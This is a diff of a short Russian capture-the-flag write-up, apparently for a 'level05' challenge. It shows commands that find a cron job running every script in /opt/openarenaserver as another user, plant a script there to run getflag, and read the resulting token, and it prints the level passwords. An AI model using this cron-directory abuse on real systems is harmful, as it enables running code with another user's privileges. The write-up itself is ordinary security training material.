@@ -8,16 +8,16 @@ ne2searoevaevoem4ov4ar8ap
 
 получаем сообщение, что пришла почта
 поиском находим письмо в папке /var/mail:
-find / -name "mail"
-cd /var/mail
-ls -la
-cat level05
+> find / -name "mail"
+> cd /var/mail
+> ls -la
+> cat level05
 */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 google */2 * * * *
 https://crontab.guru/every-2-minutes
 
 Открываем скрипт по адресу /usr/sbin/openarenaserver:
-cat /usr/sbin/openarenaserver
+> cat /usr/sbin/openarenaserver
 #!/bin/sh
 
 for i in /opt/openarenaserver/* ; do
@@ -27,17 +27,16 @@ done
 По содержимому скрипта понимаем, что этот скрипт срабатывает каждые 2 минуты и выполняет все скрипты из папки /opt/openarenaserver/ и затем удаляет их.
 
 Нам нужно добавить свой скрипт на выполнение getflag:
-vim /opt/openarenaserver/script:
+> vim /opt/openarenaserver/script:
 #!/bin/bash
-/bin/getflag > /tmp/getflag
+> /bin/getflag > /tmp/getflag
 
-#echo "getflag > /tmp/AnyName" > /opt/openarenaserver/AnyName
 
 Cпустя 2 минуты откроем его:
-cat /tmp/getflag
+> cat /tmp/getflag
 Check your flag.Here is eour token : viuaaale9huek52boumoomioc
 
-su level06
+> su level06
 viuaaale9huek52boumoomioc
 
 Done!
